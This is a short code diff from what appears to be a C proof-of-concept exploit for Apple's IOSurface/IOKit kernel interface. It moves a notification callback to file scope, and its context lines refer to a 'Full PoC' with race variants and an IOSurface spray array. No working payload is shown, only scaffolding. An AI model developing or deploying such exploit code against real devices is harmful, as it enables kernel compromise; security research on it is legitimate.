@@ -1402,6 +1402,16 @@ static void *r209_dereg_thread(void *arg) {
     return NULL;
 }
 
+/* IOSurfaceNotifier callback — MUST be non-NULL to prevent crash */
+static volatile int32_t r229_notif_fire_count = 0;
+static volatile int r229_notif_last_idx = -1;
+static void r229_notif_callback(void *surf, uint32_t type, void *ctx) {
+    (void)surf; (void)type;
+    int idx = (int)(uintptr_t)ctx;
+    r229_notif_last_idx = idx;
+    __sync_fetch_and_add(&r229_notif_fire_count, 1);
+}
+
 /* Phase 13: Full PoC Stage C+D — Metal render loop + race variants */
 static volatile int p13_spam_run = 0;
 static io_connect_t p13_spam_conn = IO_OBJECT_NULL;
@@ -19281,17 +19291,6 @@ new_modes:
          *
          * We load Metal dynamically via dlopen since the probe is pure C.
          */
-        /* IOSurfaceNotifier callback — MUST be non-NULL to prevent crash
-         * when notification dispatch tries to invoke the callback. */
-        static volatile int32_t r229_notif_fire_count = 0;
-        static volatile int r229_notif_last_idx = -1;
-        static void r229_notif_callback(IOSurfaceRef surf, uint32_t type, void *ctx) {
-            (void)surf; (void)type;
-            int idx = (int)(uintptr_t)ctx;
-            r229_notif_last_idx = idx;
-            __sync_fetch_and_add(&r229_notif_fire_count, 1);
-        }
-
         /* r229 variables shared between Phase 13 and Phase 14 */
         static IOSurfaceRef r229_matched_surf = NULL;
         static IOSurfaceRef r229_spray_static[256]; /* copy for Phase 14 access */
